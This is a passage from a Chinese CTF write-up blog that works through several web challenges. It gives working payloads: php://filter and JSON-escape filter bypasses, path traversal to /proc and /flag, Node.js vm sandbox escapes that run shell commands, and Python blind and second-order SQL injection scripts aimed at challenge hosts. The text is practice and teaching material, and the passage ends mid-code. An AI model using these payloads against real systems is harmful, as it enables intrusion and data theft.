<p>第一个要求很容易满足，我们看第二个，需要传入变量decrypt，使其强等于<code>aesEn($data, ‘y1ng‘);</code>的加密结果在该加密算法中存在的唯一变量是 $data ,而 <code>$data = $_SESSION[‘secret‘];</code>,我们看代码最后面，可以知道 $_SESSION[‘secret‘]; 是由伪随机数长度加密得到的。</p>
<p>但是假如我们另session 为空，那么自然而然就不存在 $_SESSION[‘secret‘]; ，这个时候aesEn加密得到的值就是固定的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = md5(<span class="string">&#x27;IP&#x27;</span>,<span class="literal">true</span>);   <span class="comment">//这里的IP要填自己环境的IP</span></span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt(<span class="variable">$data</span>, <span class="variable">$method</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA , <span class="variable">$iv</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> aesEn(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传值即可</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><strong>知识点</strong></p>
<ol>
<li><strong>JSON转义字符绕过</strong></li>
<li><strong>php://filter</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$banword</span> = [</span><br><span class="line">      <span class="comment">// no path traversal</span></span><br><span class="line">      <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">      <span class="comment">// no stream wrapper</span></span><br><span class="line">      <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">      <span class="comment">// no data exfiltration</span></span><br><span class="line">      <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">      <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure>


<p>1.<strong>json转义字符绕过</strong></p>
<p><strong><code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效</strong></p>
<p>2.<strong>伪协议读取</strong></p>
<p>由于$content中不能存在 <code>/HarekazeCTF\&#123;.+\&#125;/i</code>类似内容，所有我们可以对content 进行base64 加密，这里用到了 php://filter 伪协议</p>
<p>payload：</p>
<blockquote>
<p>{“page”:”php://filter/convert.base64-encode/resource=/flag”}</p>
<p>{“page”:”\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067”}</p>
</blockquote>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>不知道什么原因 页面回显极慢，没做，记录下原理</p>
<p>知识点：</p>
<ol>
<li>X-Forwarded-For 伪造</li>
<li>二次注入</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:27406/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;GET&quot;</span>: <span class="string">&quot;/ HTTP/1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=fdb4b6d2-49df-4480-faf2-c1ff21685796&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    print(<span class="string">&quot;第&#123;&#125;个:&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    mid = (l + r) &gt;&gt; <span class="number">1</span>     <span class="comment">#相当于mid除2取整所得</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;</span>.<span class="built_in">format</span>(i, mid + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1&quot;</span> <span class="keyword">in</span> html_0.text: <span class="comment"># 这里判断到的语句为第一个，即`.format(i, mid)`的那个</span></span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>




<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>知识点：</p>
<ol>
<li>/proc/[pid]/fd</li>
<li>反弹shell</li>
</ol>
<p><strong>linux进程管理之打开的每个进程的链接</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>pid/cmdline  包含了用于开始进程的命令  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/cwd 包含了当前进程工作目录的一个链接  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/environ  包含了可用进程环境变量的列表  ；</span><br><span class="line"><span class="regexp">/proc/</span>pid/exe  包含了正在进程中运行的程序链接；</span><br><span class="line"><span class="regexp">/proc/</span>pid<span class="regexp">/fd/</span>  这个目录包含了进程打开的每一个文件的链接；</span><br><span class="line"><span class="regexp">/proc/</span>pid/mem  包含了进程在内存中的内容；</span><br><span class="line"><span class="regexp">/proc/</span>pid/stat 包含了进程的状态信息；</span><br><span class="line"><span class="regexp">/proc/</span>pid/statm  包含了进程的内存使用信息。</span><br></pre></td></tr></table></figure>




<p>预期解的话基本上解法和 [V&amp;N2020 公开赛]CHECKIN 一模一样，由于不知道什么原因，一直报<code>Wrong Key!</code>，题目没有进行下去,这里就不多加赘述</p>
<p>paylaod:<code>/page?url=../../../../proc/self/fd/3</code>，这里的<code>/proc/self</code>也是一个链接文件，当进程访问此链接时，就会访问这个进程本身的<code>/proc/pid目录</code>,从而得到 secret_key ，之后反弹shell即可，flag在根目录，可以直接 cat /flag</p>
<p>非预期解</p>
<blockquote>
<p>?url=../../../../../../flag</p>
</blockquote>
<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>vm.js 沙箱逃逸与关键字符绕过</strong></li>
<li><strong>JavaScript 模板字符串</strong></li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>js中. 可以用[]代替. (点号)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="string">``</span>反引号代替双引号</span><br><span class="line"><span class="built_in">TypeError</span>.prototype==<span class="built_in">TypeError</span>[<span class="string">`\xxx\xxx\xxx\xxx`</span>] </span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>占位符来拼接字符串</span><br><span class="line">比如这里 prototype 被过滤了，我们可以这样书写  <span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>
<p><strong>js测试的话可以用Error().stack直接查看报错信息，还能获取更多的信息</strong></p>
<p>payload1:</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name">function</span> ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)()<span class="comment">;</span></span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(<span class="name">Buffer.from</span>(``)).a = <span class="number">1</span><span class="comment">;</span></span><br><span class="line">    &#125;catch(<span class="name">e</span>)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString()<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>


<p>payload2</p>
<p><code>join</code>拼接字符串</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">(()=&gt;&#123; <span class="symbol">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = f=&gt;f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); try&#123; <span class="symbol">Object</span>[<span class="string">`preventExtensions`</span>](<span class="symbol">Buffer</span>[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;catch(e)&#123; return e[<span class="string">`a`</span>](()=&gt;&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>


<p><a href="https://xz.aliyun.com/t/7184#toc-10" target="_blank">Node.js 常见漏洞学习与总结</a></p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>题目没有什么难度，不过也给我提了一个醒。以前看到 Js 文件一般都是直接跳过，，以后要对Js 文件多加留意</p>
<p>payload：</p>
<p>因为回自动跳转到 /die/ ,用burp suite 抓包，总流程如下</p>
<p>/  –&gt; /chase –&gt; /leftt  –&gt; /shoot –&gt; /door  –&gt; /static/js/door.js  –&gt; /open –&gt; /static/js/open_sesame.js  –&gt;    /fight   –&gt;  /static/js/fight.js  得到如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拼接下即可得到flag</p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>知识点：ThinkPHP6.0任意文件创建</p>
<p>/robots.txt  可以发现 <a href="http://www.thinkphp.cn/">ThinkPHP</a> V6.0.0  报错，直接搜exp</p>
<p><a href="https://www.anquanke.com/post/id/197261" target="_blank">ThinkPHP6.0任意文件创建分析   https://www.anquanke.com/post/id/197261</a></p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>from for</strong></li>
<li><strong>select 0+’test’+0;</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT &#39;0&#39;+&#39;test&#39;+&#39;0&#39;；</span><br><span class="line">+------------------+</span><br><span class="line">|  &#39;0&#39;+&#39;test&#39;+&#39;0&#39;  |</span><br><span class="line">+------------------+</span><br><span class="line">|         0        |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+hex(&#39;test&#39;)+&#39;0&#39;；</span><br><span class="line">+-----------------------+</span><br><span class="line">|  &#39;0&#39;+hex(&#39;test&#39;)+&#39;0&#39;  |</span><br><span class="line">+-----------------------+</span><br><span class="line">|        74657374       |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这样’test’字符串的十六进制就会成功显示出来</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT hex(&#39;flag&#39;)；</span><br><span class="line">+-----------------------+</span><br><span class="line">|      hex(&#39;flag&#39;)      |</span><br><span class="line">+-----------------------+</span><br><span class="line">|        666C6167       |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+hex(&#39;flag&#39;)+&#39;0&#39;；</span><br><span class="line">+-----------------------+</span><br><span class="line">|  &#39;0&#39;+hex(&#39;flag&#39;)+&#39;0&#39;  |</span><br><span class="line">+-----------------------+</span><br><span class="line">|           666         |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;flag的十六进制里存在字母。如果让它和’0’相加的话,会存在截断的问题,我们可以二次hex，让最后的结果全是数字，这样就不存在截断的问题了</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT hex(hex(&#39;flag&#39;))；</span><br><span class="line">+-----------------------+</span><br><span class="line">|    hex(hex(&#39;flag&#39;))   |</span><br><span class="line">+-----------------------+</span><br><span class="line">|   3636364336313637    |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">&#x2F;但是如果结果超过10位的话，会转成科学计数法，导致丢失数据。因此要用substr来截：</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;0&#39;+substr(hex(hex(&#39;flag&#39;)) from 1 for 10)+&#39;0&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| &#39;0&#39;+substr(hex(hex(&#39;flag&#39;)) from 1 for 10)+&#39;0&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                    3636364336                  |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里的话因为fuzz发现逗号，information等被过滤，所有用from ... for .. 代替逗号，猜测表名为flag</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">login_url=<span class="string">&#x27;http://ad9e4b4c-00ee-47c4-8298-b750b130f0d1.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">register_url=<span class="string">&#x27;http://ad9e4b4c-00ee-47c4-8298-b750b130f0d1.node3.buuoj.cn/register.php&#x27;</span></span><br><span class="line">content=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/Program Files/JetBrains/PyCharm 2020.3.1/project/1.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        data_register=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123@%d&#x27;</span>%i,<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;0&#x27;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&#x27;0&quot;</span>%i,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        data_login=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123@%d&#x27;</span>%i,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        requests.post(register_url,data=data_register)</span><br><span class="line">        rr=requests.post(login_url,data=data_login)</span><br><span class="line">        rr.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        r=rr.text</span><br><span class="line">        location=r.find(<span class="string">&#x27;user-name&#x27;</span>)</span><br><span class="line">        cont=r[location+<span class="number">17</span>:location+<span class="number">42</span>].strip()</span><br><span class="line">        f.write(cont)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一种方法是结合limit offset进行盲注</p>
<p> *<em>select * from table limit 2 offset 1;*</em>      </p>
<p><strong>//含义是从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">db_name=<span class="string">&quot;&quot;</span></span><br><span class="line">url= <span class="string">&quot;http://7f01519f2fe14923acb0d2a096255f7302bd502b499a47ed.game.ichunqiu.com/register.php&quot;</span></span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">##当前数据库名长度##</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">148</span>):</span><br><span class="line">        db_payload=<span class="string">&quot;&#x27; or (case when ascii(mid((select * from flag limit 1 offset 0)from(%d)for(1)))=&#x27;%d&#x27; then sleep(3) else &#x27;b&#x27; end)=&#x27;a&quot;</span>%(a,i)</span><br><span class="line">        da=&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;11@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:db_payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;11&quot;</span>&#125;</span><br><span class="line">        print(db_payload)</span><br><span class="line">        startTime=time.time()</span><br><span class="line">        r=requests.post(url,data=da,timeout=<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> time.time()-startTime&gt;<span class="number">2</span>:</span><br><span class="line">            database+=<span class="built_in">chr</span>(i)</span><br><span class="line">            print(database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>花了挺多时间的一题，学到了很多，很有必要详细记录一下</p>
<p>打开环境，发现是个留言板，想要发贴，需要先登入</p>
<blockquote>
<p>zhangwei</p>
<p>zhangwei666</p>
</blockquote>
<p>很明显的提示，直接猜中</p>
<p>看着留言板，第一感觉是sql注入 <del>，一直在找注入点，没找到</del>。后知后觉，还没扫源码<br>扫下源码 Git泄露，Githacker 恢复下，不过审计后发现代码不完整</p>
<blockquote>
<p>git log  –reflog<br>git reset  –hard  xxx</p>
</blockquote>
<p>用以上两个命令，得到完整代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = 